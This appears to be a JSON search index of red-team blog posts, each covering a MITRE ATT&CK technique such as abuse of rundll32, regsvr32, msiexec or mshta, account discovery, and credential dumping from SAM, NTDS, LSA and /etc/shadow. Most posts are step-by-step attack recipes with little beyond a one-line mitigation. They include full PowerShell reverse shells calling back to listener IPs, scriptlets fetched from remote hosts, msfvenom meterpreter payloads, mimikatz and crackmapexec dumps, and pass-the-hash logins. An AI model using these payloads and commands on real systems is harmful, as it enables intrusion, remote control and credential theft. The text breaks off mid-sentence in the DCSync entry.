{ "title": "RUNDLL32", "url": "/posts/rundll/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1218.011 Tactic : Defense Evasion Platforms: WindowsRUNDLL32rundll32.exe Is a windows utility that Loads and runs 32-bit dynamic-link libraries (DLLs).Adversaries may abuse rundll32.exe to proxy execution of malicious code.ExploitationsCommand PromptExecute VBscript To Invoke CalculatorExecute the below commmand to invoke calculatorrundll32 vbscript:&quot;\\..\\mshtml,RunHTMLApplication &quot;+String(CreateObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;),0)invoking calculatorExecute VBscript To Get Reverse ShellTo get a reverse shell, copy the below powershell script to your .ps1 file, update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port], then execute the below command to get a reverse shell.reverse shell in powershell$client = New-Object System.Net.Sockets.TCPClient(&#39;10.42.0.1&#39;,10000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&amp;gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()Command rundll32 vbscript:&quot;\\..\\mshtml,RunHTMLApplication &quot;+String(CreateObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -w Hidden -file [path/to/your/file.ps1]&quot;&quot;:&quot;),0)Executing rev.ps1 to get a reverse shellrundll32 vbscript:&quot;\\..\\mshtml,RunHTMLApplication &quot;+String(CreateObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -w Hidden -file rev.ps1&quot;&quot;:&quot;),0)Getting reversh shellExecute Javascript To Get Reverse ShellTo get a reverse shell, copy the below script to your .sct file, update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port], host .sct file on your server i.e python3 -m http.server [port] then execute the below command to get a reverse shell.content of exploit.sct&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;&amp;lt;scriptlet&amp;gt; &amp;lt;!-- Reverse Shell --&amp;gt;&amp;lt;public&amp;gt; &amp;lt;method name=&quot;Exec&quot;&amp;gt;&amp;lt;/method&amp;gt;&amp;lt;/public&amp;gt;&amp;lt;script language=&quot;JScript&quot;&amp;gt;&amp;lt;![CDATA[ function Exec() { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&#39;powershell -w Hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient(\\&#39;10.42.0.1\\&#39;,10000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + \\&#39;PS \\&#39; + (pwd).Path + \\&#39;&amp;gt; \\&#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&#39;); }]]&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/scriptlet&amp;gt;Command rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:[file_url]&quot;).Exec();executing rundll32 to get reverse shellrundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://10.42.0.1/exploit.sct&quot;).Exec();getting reversh shellMetasploitGenerating .dll Exploit With Msfvenom msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=[port] -f dll -o [file_name.dll]┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.42.0.1 lport=10000 -f dll -o exploit.dllTo use retry middleware with Faraday v2.0+, install `faraday-retry` gem[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of dll file: 8704 bytesSaved as: exploit.dll┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lsexploit.dllGetting Meterpreter Shellexecuting rundll32 in windowscommand rundll32 shell32.dll,Control_RunDLL [dll_file_path]rundll32 shell32.dll,Control_RunDLL C:\\Users\\IEUser\\Desktop\\exploit.dllsetting metasploit listener, getting reverse shellMitigations Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurringReferences https://atomicredteam.io/defense-evasion/T1218.011/ https://attack.mitre.org/techniques/T1218/011/ https://attack.mitre.org/mitigations/M1050/ https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows" }, { "title": "REGSVR32", "url": "/posts/regsrv/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1218.010 Tactic : Defense Evasion Platforms: WindowsREGSVR32Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs). Adversaries may abuse Regsvr32.exe to proxy execution of malicious code.ExploitationsCommand PromptExecute Local Com Scriptlet To Invoke CalculatorCopy the below script to your .sct file, then execute the following command to invoke calculator.com scriptlet to invoke calculator&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration progid=&quot;PoC&quot; classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &amp;gt; &amp;lt;script language=&quot;JScript&quot;&amp;gt; &amp;lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); ]]&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/registration&amp;gt;&amp;lt;/scriptlet&amp;gt;Command regsvr32.exe /n /s /u /i:[file_sct] scrobj.dllregsvr32.exe /n /s /u /i:cmd.sct scrobj.dllExecute Local Com Scriptlet To Get Reverse ShellTo be able to get a reverse shell, copy the below script to your .sct file, update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port], then execute the below command on your target machine.com scriptlet reverse shell&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration progid=&quot;PoC&quot; classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &amp;gt; &amp;lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&#39;powershell -w Hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient(\\&#39;10.42.0.1\\&#39;,10000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + \\&#39;PS \\&#39; + (pwd).Path + \\&#39;&amp;gt; \\&#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&#39;); ]]&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/registration&amp;gt;&amp;lt;/scriptlet&amp;gt;Command regsvr32.exe /n /s /u /i:[file_sct] scrobj.dllregsvr32.exe /n /s /u /i:rev.sct scrobj.dllgetting a reverse shellExecute Remote Com Scriptlet To Get Reverse ShellTo be able to get a reverse shell, host the below .sct script to your server i.e python3 -m http.server update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port]. then execute the below command on your target machine.com scriptlet reverse shell&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;&amp;lt;scriptlet&amp;gt;&amp;lt;registration progid=&quot;PoC&quot; classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &amp;gt; &amp;lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&#39;powershell -w Hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient(\\&#39;10.42.0.1\\&#39;,10000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + \\&#39;PS \\&#39; + (pwd).Path + \\&#39;&amp;gt; \\&#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&#39;); ]]&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/registration&amp;gt;&amp;lt;/scriptlet&amp;gt;Command regsvr32.exe /n /s /u /i:[url] scrobj.dllregsvr32.exe /n /s /u /i:http://10.42.0.1/rev.sct scrobj.dllgetting a reverse shellPowershell EmpireUse uselistener to setup your listener, with the listener setup, use usestager windows/launcher_sct to generate your payload, host your payload on your server, then execute the following command on target system regsvr32.exe /n /s /u /i:[url] scrobj.dll.Setup ListenerGenerate StagerExecuting Command On WindowsReceiving AgentMitigations Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.References https://attack.mitre.org/techniques/T1218/010/ https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32 https://attack.mitre.org/mitigations/M1050/" }, { "title": "MSIEXEC", "url": "/posts/msiexec/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1218.007 Tactic : Defense Evasion Platforms: WindowsMSIEXECMsiexec.exe Is a command-line utility that Provides the means to install, modify, and perform operations on Windows Installer from the command line.Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.ExploitationsInvoke CalculatorGenerate payload using msfvenom, transfer the payload to your windows machine, then execute the below command to invoke calculator.generating payload msfvenom -p windows/exec CMD=calc.exe -f msi &amp;gt; [file_name.msi]┌──(cyberkhalid㉿kali)-[~/redteam/exploit]└─$ msfvenom -p windows/exec CMD=calc.exe -f msi &amp;gt; cmd.msiTo use retry middleware with Faraday v2.0+, install `faraday-retry` gem[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 193 bytesFinal size of msi file: 159744 bytesCommand msiexec /q /i &quot;[local_msi_file]&quot;executing payload to invoke calculatormsiexec /q /i &quot;C:\\Users\\IEUser\\Desktop\\calc.msi&quot;Execute Local MSI file To Get Meterpreter ShellTo get meterpreter shell, you need to generate meterpreter payload using msfvenom, transfer it to windows machine, setup your metasploit listener, then execute the below command.generating meterpreter payload msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=[port] -f msi -o [file_name.msi]┌──(cyberkhalid㉿kali)-[~/redteam/exploit]└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.42.0.1 lport=10000 –f msi -o rev.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesCommand msiexec /q /i &quot;[local_msi_file]&quot;executing msiexec to get reverse shellmsiexec /q /i &quot;C:\\Users\\IEUser\\Desktop\\rev.msi&quot;setting metasploit listener, getting reverse shellExecute Remote MSI file To Get Meterpreter ShellTo get meterpreter shell, you need to generate meterpreter payload using msfvenom, host it on your server i.e python -m http.server, setup your metasploit listener, then execute the below command.generating payload┌──(cyberkhalid㉿kali)-[~/redteam/exploit]└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.42.0.1 lport=10000 –f dll &amp;gt; rev.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesCommand msiexec /q /i &quot;[file_url]&quot;executing msiexec to get reverse shellmsiexec /q /i &quot;http://10.42.0.1/rev.msi&quot;setting metasploit listener, getting reverse shellMitigations Disable or Remove Mshta.exe. Restrict execution of Msiexec.exe to privileged accounts or groups.References https://attack.mitre.org/techniques/T1218/007/ https://attack.mitre.org/mitigations/M1042/ https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows" }, { "title": "MSHTA", "url": "/posts/mshta/", "categories": "Red Teaming, Defense Evasion", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1218.005 Tactic : Defense Evasion Platforms: WindowsMSHTAMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. Mshta.exe can be used to bypass application control solutions that do not account for its potential use.ExploitationsCommand PromptExecute VBscript To Invoke CalculatorExecute the below commmand to invoke calculatormshta vbscript:Execute(&quot;CreateObject(&quot;&quot;Wscript.Shell&quot;&quot;).Run &quot;&quot;calc.exe&quot;&quot;:close&quot;)invoking calculatorExecute VBscript To Get Reverse ShellTo get a reverse shell, copy the below powershell script to your .ps1 file, update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port], then execute the below command to get a reverse shell.reverse shell in powershell$client = New-Object System.Net.Sockets.TCPClient(&#39;10.42.0.1&#39;,5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&amp;gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()Command mshta vbscript:Execute(&quot;CreateObject(&quot;&quot;Wscript.Shell&quot;&quot;).Run &quot;&quot;powershell -w Hidden -file [path/to/your/file.ps1]&quot;&quot;:close&quot;)Executing rev.ps1 to get a reverse shellmshta vbscript:Execute(&quot;CreateObject(&quot;&quot;Wscript.Shell&quot;&quot;).Run &quot;&quot;powershell -w Hidden -file rev.ps1&quot;&quot;:close&quot;)Getting reversh shellExecute Javascript To Get Reverse ShellTo get a reverse shell, copy the below script to your .sct file, update the ip address and port to your reverse shell listener’s ip and port, start your listener i.e nc -nlvp [port], host .sct file on your server i.e python3 -m http.server [port] then execute the below command to get a reverse shell.content of exploit.sct&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;&amp;lt;scriptlet&amp;gt; &amp;lt;!-- Reverse Shell --&amp;gt;&amp;lt;public&amp;gt; &amp;lt;method name=&quot;Exec&quot;&amp;gt;&amp;lt;/method&amp;gt;&amp;lt;/public&amp;gt;&amp;lt;script language=&quot;JScript&quot;&amp;gt;&amp;lt;![CDATA[ function Exec() { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&#39;powershell -w Hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient(\\&#39;170.170.6.136\\&#39;,5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + \\&#39;PS \\&#39; + (pwd).Path + \\&#39;&amp;gt; \\&#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&#39;); }]]&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/scriptlet&amp;gt;Command mshta.exe javascript:a=(GetObject(&#39;script:[file_url]&#39;)).Exec();close();executing mshta to get reverse shellmshta.exe javascript:a=(GetObject(&#39;script:http://170.170.6.136:90/exploit.sct&#39;)).Exec();close();getting reversh shellMetasploitGenerating .hta Exploit With Msfvenom msfvenom -p [payload] lhost=[ip] lport=[port] -f hta-psh -o [file_name.hta]┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.43.1 lport=5000 -f hta-psh -o exploit.htaTo use retry middleware with Faraday v2.0+, install `faraday-retry` gem[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of hta-psh file: 7368 bytesSaved as: exploit.htaGetting Command Shellexecuting mshta in windowscommand mshta [file_url]setting metasploit listener, getting reverse shellPowershell EmpireUse uselistener to setup your listener, with the listener setup, use usestager windows/hta to generate your payload, host your payload on your server, then execute the following command on target system mshta [http://your_host/your_file.hta]Setting ListenerUsing windows/hta StagerGetting Reverse ShellMitigations Disable or Remove Mshta.exe. Block execution of mshta.exe.References https://attack.mitre.org/techniques/T1218/005/ https://docs.microsoft.com/en-us/previous-versions//ms536471(v=vs.85)?redirectedfrom=MSDN https://atomicredteam.io/defense-evasion/T1218.005/ https://attack.mitre.org/techniques/T1218/005/ https://attack.mitre.org/mitigations/M1038/ https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows" }, { "title": "Process Discovery", "url": "/posts/processdiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Process Discovery ID : T1057 Tactic : Discovery Platforms: Windows, linux, macosProcess DiscoveryAdversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.ExploitationsWindowsCommand PromptWe can get the list of a running processes in windows by executing this command in command prompt.tasklistPowershellWe can get the list of a running processes in windows by executing this command in powershell.get-processLinuxWe can get the list of a running processes in linux by executing the below command.ps auxReferences https://attack.mitre.org/techniques/T1057/ https://atomicredteam.io/discovery/T1057/" }, { "title": "Permission Groups Discovery -&gt; Local Groups", "url": "/posts/plocalccountdiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Permission Groups Discovery : Local Groups ID : T1069.001 Tactic : Discovery Platforms: Windows, linux, macosLocal GroupsAdversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.ExploitationsWindowsCommand PromptWe will use command prompt to list the members of a specific group. To do that, we will have to get the list of available groups on the system and then choose the one that looks interesting to us i.e Administrators. Let’s execute the following command to get the list of available groups.net localgroupAs you can see , we were able to list the available groups on the system.Now let’s list the members of Administrators group since it has higher privileges than other groups.net localgroup AdministratorsAs you can see, we were able to get the members of Administrators group.PowershellWe will use powershell to list the members of a specific group. To do that, we will have to get the list of available groups on the system and then choose the one that looks interesting to us i.e Administrators. Let’s execute the following command to get the list of available groups.get-localgroupAs you can see , we were able to list the available groups on the system.Now let’s list the members of Administrators group since it has higher privileges than other groups.get-localgroupmember -Name AdministratorsReferences https://attack.mitre.org/techniques/T1069/001/ https://atomicredteam.io/discovery/T1069.001/" }, { "title": "Permission Groups Discovery -&gt; Domain Groups", "url": "/posts/pdomaingrouptdiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Permission Groups Discovery : Domain Groups ID : T1069.002 Tactic : Discovery Platforms: Windows, linux, macosDomain GroupsAdversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.ExploitationsWindowsCommand PromptWe will use command prompt to list the members of a specific group. To do that, we will have to get the list of available groups on the system and then choose the one that looks interesting to us i.e Domain Admins. We will execute net group /domain to get domain groups, and then net group &quot;Domain Admins&quot; /domain to get the members of the domain admins.net group /domainnet group &quot;Domain Admins&quot; /domainAs you can see, we were able to get the members of “Domain Admins” group.PowerviewWe can get thesame result with powerview. Import powerview script and execute the below command.get-netgroupmember &quot;Domain Admins&quot; | select MembernNameAs you can see, we were able to get the members of “Domain Admins” group.References https://attack.mitre.org/techniques/T1069/001/ https://atomicredteam.io/discovery/T1069.001/" }, { "title": "Group Policy Discovery", "url": "/posts/grouppolicydiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Group Policy Discovery ID : T1615 Tactic : Discovery Platforms: WindowsGroup Policy DiscoveryAdversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD).ExploitationsWindowsCommand PromptWe can use gpresult to get the Group Policy Setting applied on a domain object i.e user object, computer object.gpresult /R /VPowerviewWe can use powerview to get the list of group policy objects within a domain. Import powerview script and then execute the below command.get-netgpo | select displayname, cnReferences https://attack.mitre.org/techniques/T1615/" }, { "title": "Domain Account", "url": "/posts/domainaccountdiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Domain Account ID : T1087.002 Tactic : Discovery Platforms: Windows, linux, macosLocal AccountAdversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.ExploitationsWindowsCommand PromptUsersWe can list domain user accounts in windows os by executing the following command in command prompt or powershell.net user /domainAbove image shows the listing of domain user accounts.GroupsWe can list domain groups in windows os by executing the following command in command prompt or powershell.net group /domainAbove image shows the listing of domain groups.PowerviewUsersWe can use powerview to list domain user accounts in windows os. Import powerview script and execute the below command.get-netuser | select nameAbove image shows the listing of domain user accounts.GroupsWe can use powerview to list domain groups in windows os. Import powerview script and execute the below command.get-netgroup | select samaccountnameAbove image shows the listing of domain groups.References https://attack.mitre.org/techniques/T1087/002/ https://atomicredteam.io/discovery/T1087.002/" }, { "title": "Local Account", "url": "/posts/localaccountdiscovery/", "categories": "Red Teaming, Discovery", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "Local Account ID : T1087.001 Tactic : Discovery Platforms: Windows, linux, macosLocal AccountAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.ExploitationsWindowsCommand PromptUsersWe can list local user accounts in windows os by executing the following command in command prompt.net userordir C:\\Users\\Above images show the listing of local user accounts.GroupsWe can list available groups in windows os by executing the following command in command prompt.net localgroupAbove image shows the listing of groups.PowershellUsersWe can list local user accounts in windows os by executing the following command in powershell.get-localuserAbove image shows the listing of local user accounts.GroupsWe can list available groups in windows os by executing the following command in powershell.get-localgroupAbove image shows the listing of groups.LinuxUsersWe can list local user/system accounts in linux os by executing this command.cat /etc/passwdAbove image shows the listing of local user/system accounts.GroupsWe can list available groups in linux os by executing this command.groupsReferences https://attack.mitre.org/techniques/T1087/001/ https://atomicredteam.io/discovery/T1087.001/" }, { "title": "Security Account Manager (SAM)", "url": "/posts/sam/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.002 Tactic : Credential Access Platforms: WindowsSecurity Account Manager (SAM)SAM Is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.ExploitationMimikatzWe can dump sam credential using mimikatz. To do that, we need to download or transfer mimikatz to our target system(windows), then execute it ./mimikatz.exe. After executing mimikatz, we will elevate our privilege to nt authority by executing token::elevate. With our privilege elevated, we can dump sam credential by executing lsadump::sam, this will provide us with credentials stored in sam.In the above image, we were able to obtain password hash of local administrator.CrackMapExecWe can dump sam credential with crackmapexec by executingcrackmapexec smb 10.42.0.10 -u Administrator -p Password@123 --samIn the above image, we were able to obtain password hash of sam database.Access With Evil-WinrmWith the help of evil-winrm, we can use the password hash to get access to our target system.evil-winrm -i 10.42.0.10 -u Administrator -H a29f7623fd11550def0192de9246f446bThe above image shows we logged in as Administrator.Mitigations Consider disabling or restricting NTLM. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled. Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.References https://attack.mitre.org/techniques/T1003/002/ https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-sam https://book.hacktricks.xyz/windows-hardening/stealing-credentials https://atomicredteam.io/credential-access/T1003.002/" }, { "title": "NTDS", "url": "/posts/ntds/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.003 Tactic : Credential Access Platforms: WindowsNTDSNtds file is a database that stores Active Directory data, including information about user objects, groups and group membership. Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.ExploitationCrackMapExecWe can dump ntds database with crackmapexec by executing the below commandcrackmapexec smb 10.42.0.10 -u Administrator -p Password@123 --ntdsIn the above image, we were able to dump ntds database.Secretsdump.pyWe can also dump ntds credential with impackets secretsdump.py.python3 secretsdump.py -use-vss cyber.local/Administrator:Password@123@10.42.0.10In the above image, we were able to dump ntds database.Mitigations Ensure Domain Controller backups are properly secured. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled. Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.References https://attack.mitre.org/techniques/T1003/002/ https://atomicredteam.io/credential-access/T1003.003/ https://book.hacktricks.xyz/windows-hardening/stealing-credentials" }, { "title": "LSA Secrets", "url": "/posts/lsa/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.004 Tactic : Credential Access Platforms: WindowsLSA SecretsLSA Stands for Local Security Authority is a protected system process that authenticates and logs on users to the local computer. When a user attempts to log on locally to the system by entering a username and password in the logon dialog box, the logon process invokes the LSA, which passes the user’s credentials to the Security Accounts Manager (SAM), which manages the account information stored in the local SAM database.The SAM compares the user’s credentials with the account information in the SAM database to determine whether the user is authorized to access the system. If it finds the user account information in the SAM database, the SAM authenticates the user by creating a logon session and returning the security identifier (SID) of the user and the SIDs of global groups of which the user is a member to the LSA.The LSA then grants the user an access token that contains the user’s individual and group SIDs and their rights, these enable the user to access resources for which he or she has permissions. Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.ExploitationsMimikatzWe can dump lsa secrets using mimikatz. To do that, we need to download or transfer mimikatz to our target system(windows), then execute it ./mimikatz.exe. After executing mimikatz, we will elevate our privilege to nt authority by executing token::elevate. With our privilege elevated, we can dump lsa secrets by executing lsadump::secrets.CrackMapExecWe can dump lsa secrets with crackmapexec by executing the below command.crackmapexec smb 10.42.0.10 -u Administrator -p Password@123 --lsaMitigations Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.References https://attack.mitre.org/techniques/T1003/004/ https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication https://networkencyclopedia.com/local-security-authority-lsa/ https://book.hacktricks.xyz/windows-hardening/stealing-credentials" }, { "title": "/etc/passwd and /etc/shadow", "url": "/posts/etc/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.008 Tactic : Credential Access Platforms: Linux/etc/passwd and /etc/shadowMost modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user. Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking.ExploitationSince we have root permission, we can read content of /etc/passwd and /etc/shadow.cat /etc/passwdcat /etc/shadowcontent of /etc/passwdcontent of /etc/shadowWe will save them (/etc/passwd and /etc/shadow) in a separate files and then transfer the files to our machine.UnshadowWith the files transfered to our machine, we will match the files (/etc/passwd and /etc/shadow) in a single file using unshadow. This is needed in order to crack the hashes.unshadow passwd.txt shadow.txt &amp;gt; unshadow.txtCrackingWe can now crack the hashes using john.john unshadow.txt --wordlist=/home/cyberkhalid/passwords.txtIn the above image, we were able to crack two hashes.Access Via SSHWe can ssh to the target machine using the credentials that we have just cracked.In the above image, we were able to login to user1 account.Mitigations Ensure that root accounts have complex, unique passwords across all systems on the network. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive information.References https://attack.mitre.org/techniques/T1003/008/" }, { "title": "DCSync", "url": "/posts/dcsync/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.006 Tactic : Credential Access Platforms: WindowsDCSyncDCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators.ExploitationMimikatzGiven that we have access to Administrator, We can conduct dcsync attack to dump password hash of any account since Administrator has permission for Replication Service across domain controller. To do that, we need to download or transfer mimikatz to our target system(windows), 